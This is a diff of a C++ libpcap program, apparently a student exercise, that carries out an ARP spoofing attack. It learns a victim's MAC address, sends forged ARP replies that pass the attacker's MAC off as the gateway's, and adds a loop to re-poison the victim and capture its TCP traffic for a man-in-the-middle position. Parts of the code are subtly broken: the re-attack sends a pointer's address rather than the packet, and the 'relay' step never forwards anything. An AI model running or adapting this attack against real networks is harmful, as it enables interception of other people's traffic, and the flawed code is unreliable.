@@ -106,11 +106,13 @@ int main(int argc, char* argv[]) {
     packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
     packet.arp_.tip_ = htonl(s_ip);  //victim ip
 
+    //ARP request packet to victim
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
 
+    //waiting for ARP reply packet from victim... to get vicitm MAC
     while (true) {
             struct pcap_pkthdr* header;
             libnet_ethernet_hdr *eth_hdr;
@@ -142,7 +144,7 @@ int main(int argc, char* argv[]) {
     //attack
     printf("start arp attack");
     //destination mac is defined (victim mac)
-    packet.eth_.smac_ = Mac(MAC_ADD);
+    packet.eth_.smac_ = Mac(MAC_ADD); //fake my mac to gateway mac
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -150,15 +152,68 @@ int main(int argc, char* argv[]) {
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
-    packet.arp_.smac_ = Mac(MAC_ADD); //gateway mac to mine
+    packet.arp_.smac_ = Mac(MAC_ADD); //fake my mac to gateway mac
     packet.arp_.sip_ = htonl(t_ip); //gateway ip
     //victim mac is defined
     packet.arp_.tip_ = htonl(s_ip);  //victim ip
 
+    //attack packet
     res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
+
+    //relay to gateway
+    //if not ARP packet, than relay to gateway all
+    //waiting for ARP reply packet from victim... to get vicitm MAC
+    while (true) {
+            struct pcap_pkthdr* header;
+            libnet_ethernet_hdr *eth_hdr;
+
+            const u_char* out_packet;
+
+            int res = pcap_next_ex(pcap, &header, &out_packet);
+            if (res == 0) continue;
+            if (res == -1 || res == -2) {
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+                break;
+            }
+
+            //hdr
+            eth_hdr = (libnet_ethernet_hdr*)(out_packet);
+            libnet_ipv4_hdr *ip_hdr_v4 = (libnet_ipv4_hdr*)(out_packet + sizeof(libnet_ethernet_hdr));
+
+            //if get ARP packet from ???? than we attack again
+            if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP){
+                //attack packet
+                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&out_packet), sizeof(EthArpPacket));
+                if (res != 0) {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                }
+                continue;
+            }
+
+            if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP){
+                       //printf("PASS! type : %d\n", ntohs(eth_hdr->ether_type));
+                       continue;
+                   }
+                   if(ip_hdr_v4->ip_p != IPPROTO_TCP){
+                       //printf("PASS! protocol : %d\n", ip_hdr_v4->ip_p);
+                       continue;
+                   }
+                   printf("%u bytes captured\n", header->caplen);
+
+           //ethernet hdr source_mac
+           printf("\nsour MAC : ");
+           for (int i = 0; i<ETHER_ADDR_LEN; i++){
+               if (i == ETHER_ADDR_LEN-1){
+                   printf("0x%02x", eth_hdr->ether_shost[i]);
+               }
+               else{
+                   printf("0x%02x:", eth_hdr->ether_shost[i]);
+               }
+           }
+    }
 
 	pcap_close(handle);
 }
